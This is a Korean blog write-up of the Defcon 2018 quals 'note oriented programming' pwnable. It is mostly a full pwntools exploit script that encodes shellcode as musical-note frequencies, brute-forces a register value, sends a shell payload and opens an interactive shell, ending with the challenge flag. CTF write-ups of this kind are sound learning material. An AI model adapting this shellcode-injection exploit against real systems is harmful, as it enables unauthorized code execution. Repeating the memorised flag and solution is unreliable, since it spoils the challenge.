---
layout:     post
title:      "Defcon 2018 note oriented programming write-up"
subtitle:   "Defcon 2018 quals pwnable"
date:       2018-05-15
author:     "NextLine"
header-img: "img/post-bg-1.png"
tags:
    - WriteUp
---

# 2018 Defcon quals note oriented programming

### 1. Introduce

쉘코딩은 언제나 즐거운데 대회때 SROP를 제대로 모르고 풀려고 해서 못풀었다.. 대회끝나자마자 SROP 포기하고 다른 가젯 이용해서 풀 수 있었다.



### 2. Exploit

note로 쉘코딩을 할 수 있었는데, A0 ~ G#9까지 사용할 수 있다. 쉘코딩을 할때 esi, edi, ebp, esp는 남아있어서 이것들을 이용해서 풀 수 있었다.

1. 스택에 0x60606600을 만듬.
2. and esi, [esi]를 통해 esi를 0x60606600으로 만듬. (이때 and라 확정적으로 값이 옮겨지는게 아니라서 브포가 필요함)
3. esi를 통해서 pop ecx와 pop edx를 넣어줌.
4. read를 호출하고 nop + shellcode로 쉘 획득.



```python
#!/usr/bin/env python
import struct
import hashlib
from ntpwn import *

def do_hash():
    r.recvuntil('Challenge: ')
    chal = r.recvuntil('\n')[:-1]
    r.recvuntil('n: ')
    n = int(r.recvuntil('\n')[:-1])
    p = process(['/home/youngjoo/def/pwn2/fastPoW',chal, str(n)])
    solution = p.recvuntil('\n')[:-1]
    p.close()
    r.sendline(solution)

def is_num(c):
    if ord(c) >= 0x30 and ord(c)<= 0x40:
        return True
    return False

note_tab = {'A':0,'A#':1,'B':2,'C':3,'C#':4,'D':5,'D#':6,'E':7,'F':8,'F#':9,'G':10,'G#':11}
def make_note(data):
    size = len(data)
    n = int(data[size-1])*12 +  (note_tab[data[:size-1]]+1)
    hz =  pow(2, float(n-49)/12)*440
    return p16(hz)

def ms(data):
    size = len(data)
    result = ''
    total_cnt = 0
    while size:
        if is_num(data[1]):
            note = data[:2]
            data = data[2:]
            result += make_note(note)
            size -= 2
            total_cnt += 1
        else:
            note = data[:3]
            data = data[3:]
            result += make_note(note)
            size -= 3
            total_cnt += 1
    return result

for i in range(0x30):
	#r = process("./nop")
	r = remote('4e6b5b46.quals2018.oooverflow.io', 31337)
	do_hash()
	#b = BP(r)
	#b.bp32(0xBEA)
	#b.done()

	r.recvuntil('a shell sound?')

	# edi = readable address
	inc_edx = ms('B8')+ms('G0')
	inc_ebx = ms('C8')+ms('G0')
	inc_esp = ms('D8')+ms('G0')
	inc_ebp = ms('E8')+ms('G0')
	inc_esi = ms('F8')+ms('G0')
	inc_edi = ms('G8')+ms('G0')
	inc_ecx = ms('A8')+ms('G0')

	# inc edx / [edx + 0x30-0x39]
	xor_al_edi = []
	for i in range(8):
		xor_al_edi.append(ms('B2')+ms('G%d'%i))

	xor_edi_al = []
	for i in range(8):
		xor_edi_al.append(ms('B0')+ms('G%d'%i))

	# inc edx / ebp = readable / [esi + 0x23]
	xor_al_esi = ms('B2F#8E0')
	xor_esi_al = ms('B0F#8E0')

	# ebp = readable
	xor_al_41 = ms('B4A8E4')
	xor_al_42 = ms('B4B8E4')
	xor_al_43 = ms('B4C8E4')
	xor_al_44 = ms('B4D8E4')
	xor_al_45 = ms('B4E8E4')
	xor_al_46 = ms('B4F8E4')
	xor_al_47 = ms('B4G8E4')

	# inc esp
	and_esi_esi = ms('D#6')

	sh = ''

	# make 0x2f [0x4f ^ 0x20 ^ 0x41 ^ 0x42 ^ 0x43]
	sh += xor_al_edi[0] # 0x4f
	sh += inc_esi * 0x21
	sh += xor_al_esi # 0x20
	sh += xor_al_41
	sh += xor_al_42
	sh += xor_al_43

	# write 0x60 [0x2f ^ 0x4f]
	sh += inc_esi * 0x2c
	sh += xor_esi_al

	# make 0x29 [0x2f ^ 0x41 ^ 0x47] & write 0x66 [0x29 ^ 0x4f]
	sh += inc_esi
	sh += xor_al_41
	sh += xor_al_47
	sh += xor_esi_al

	# make 0x2f [0x29 ^ 0x41 ^ 0x47] & write 0x60 [0x2f ^ 0x4f]
	sh += inc_esi
	sh += xor_al_41
	sh += xor_al_47
	sh += xor_esi_al

	# write 0x60 [0x2f ^ 0x4f]
	sh += inc_esi
	sh += xor_esi_al

	# mov esi to ([stack] = 0x60606660)
	sh += inc_esi * 0x20

	# set esp
	sh += inc_esp * 0x6f

	# and esi [esi] (brute forcing)
	sh += and_esi_esi

	# make Y : pop ecx
	#sh += inc_esi
	sh += xor_al_42
	sh += xor_esi_al

	# make Z : pop edx
	sh += inc_esi * 2
	sh += xor_al_41
	sh += xor_al_42
	sh += xor_esi_al

	# dummy
	sh += ms('A4') * 0x200

	# make eax = 3
	sh += xor_al_41
	sh += inc_edi * 0x1a
	sh += xor_al_edi[0]
	sh += xor_al_42

	sh += "\x00\x00"

	print "LEN : 0x%x" % len(sh)
	r.send(sh)
	r.recv(10)
	try:
		r.send('\x90' * 0x300 + asm(shellcraft.sh()))
		r.sendline('ls')
		r.recv(10,timeout=3)
	except:
		r.close()
		continue

	r.interactive()

# OOO{1f_U_Ar3_r34d1n6_7h15_y0u_4r3_7h3_m0z4rT_0f_1nf053c_Ch33rs2MP!}
```
